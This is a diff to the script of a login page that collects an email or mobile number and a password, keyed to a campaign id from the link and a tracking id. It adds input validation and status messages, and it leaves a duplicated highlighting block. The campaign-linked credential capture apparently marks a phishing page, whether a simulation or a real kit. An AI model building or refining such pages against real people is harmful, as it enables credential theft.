@@ -817,19 +817,44 @@
             }
         }
 
+        // Email validation function
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
         // Form submission
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const activeTab = document.querySelector('.tab.active').id;
+            const password = document.getElementById('password').value.trim();
+            
+            // Basic validation
+            if (!password) {
+                showErrorMessage('Please enter your password');
+                return;
+            }
+            
             const campaignId = getOrSetCampaignId();
+            if (!campaignId) {
+                showErrorMessage('Missing campaign id. Please use a valid link.');
+                return;
+            }
+            
             const trackingId = getOrCreateTrackingId();
             
             let loginData = {};
             
             if (activeTab === 'mobile-tab') {
                 const countryCode = document.querySelector('.country-code').value;
-                const mobile = document.querySelector('input[type="tel"]').value;
+                const mobile = document.querySelector('input[type="tel"]').value.trim();
+                
+                if (!mobile) {
+                    showErrorMessage('Please enter your mobile number');
+                    return;
+                }
+                
                 const fullMobile = countryCode + mobile;
                 
                 loginData = {
@@ -837,14 +862,25 @@
                     country_code: countryCode,
                     mobile: mobile,
                     email: fullMobile, // Send mobile number as email field for consistency
-                    password: document.getElementById('password').value
+                    password: password
                 };
             } else if (activeTab === 'email-tab') {
-                const email = document.querySelector('input[type="email"]').value;
+                const email = document.querySelector('input[type="email"]').value.trim();
+                
+                if (!email) {
+                    showErrorMessage('Please enter your email address');
+                    return;
+                }
+                
+                if (!isValidEmail(email)) {
+                    showErrorMessage('Please enter a valid email address');
+                    return;
+                }
+                
                 loginData = {
                     login_type: 'email',
                     email: email,
-                    password: document.getElementById('password').value
+                    password: password
                 };
             }
             
@@ -946,7 +982,7 @@
             console.log('Campaign ID:', campaignId);
             
             if (!campaignId) {
-                showErrorMessage('Missing attached url idmpaign id.');
+                showErrorMessage('Missing campaign id.');
                 return;
             }
             
@@ -1070,10 +1106,10 @@
             if (!button) return;
             if (isLoading) {
                 button.disabled = true;
-                button.innerHTML = '<span class="spinner"></span> Submitting...';
+                button.innerHTML = '<span class="spinner"></span> Logging in...';
             } else {
                 button.disabled = false;
-                button.innerHTML = 'Log In';
+                button.innerHTML = 'Log in';
             }
         }
 
@@ -1081,7 +1117,21 @@
             // Remove any existing messages
             const existingMessages = document.querySelectorAll('.alert');
             existingMessages.forEach(msg => msg.remove());
-            // Highlight the relevant field
+            
+            // Hide loading message if exists
+            const loadingElement = document.getElementById('loading-message');
+            if (loadingElement) {
+                loadingElement.style.display = 'none';
+            }
+            
+            // Highlight the relevant field (optional)
+            if (step === 'email') {
+                const emailInput = document.querySelector('input[type="email"]');
+                if (emailInput) emailInput.classList.add('input-error');
+            } else if (step === 'password') {
+                const passwordInput = document.getElementById('password');
+                if (passwordInput) passwordInput.classList.add('input-error');
+            }
             if (step === 'email') {
                 const emailInput = document.querySelector('input[type="email"]');
                 if (emailInput) emailInput.classList.add('input-error');
@@ -1101,7 +1151,7 @@
             // Remove message after 5 seconds
             setTimeout(() => {
                 errorDiv.remove();
-                // Remove error highlight
+                // Remove error highlight (only if step was provided)
                 if (step === 'email') {
                     const emailInput = document.querySelector('input[type="email"]');
                     if (emailInput) emailInput.classList.remove('input-error');
@@ -1110,6 +1160,58 @@
                     if (passwordInput) passwordInput.classList.remove('input-error');
                 }
             }, 5000);
+        }
+
+        function showLoadingMessage(message) {
+            // Create or update loading message element
+            let loadingElement = document.getElementById('loading-message');
+            if (!loadingElement) {
+                loadingElement = document.createElement('div');
+                loadingElement.id = 'loading-message';
+                loadingElement.className = 'alert alert-info';
+                loadingElement.style.cssText = `
+                    background-color: #d1ecf1;
+                    color: #0c5460;
+                    border: 1px solid #bee5eb;
+                    padding: 12px 16px;
+                    border-radius: 8px;
+                    margin-bottom: 20px;
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                    font-size: 14px;
+                    font-weight: 500;
+                `;
+                const form = document.getElementById('login-form');
+                form.insertBefore(loadingElement, form.firstChild);
+            }
+            loadingElement.innerHTML = `
+                <span class="spinner"></span>
+                <span>${message || 'Loading...'}</span>
+            `;
+            loadingElement.style.display = 'flex';
+        }
+
+        function showSuccessMessage() {
+            // Remove any existing messages
+            const existingMessages = document.querySelectorAll('.alert');
+            existingMessages.forEach(msg => msg.remove());
+            
+            // Create and show success message
+            const successDiv = document.createElement('div');
+            successDiv.className = 'alert alert-success';
+            successDiv.innerHTML = `
+                <i class="fas fa-check-circle"></i>
+                <span>Login successful! Redirecting...</span>
+            `;
+            const form = document.getElementById('login-form');
+            form.insertBefore(successDiv, form.firstChild);
+            
+            // Hide loading message if exists
+            const loadingElement = document.getElementById('loading-message');
+            if (loadingElement) {
+                loadingElement.style.display = 'none';
+            }
         }
     </script>
 </body>
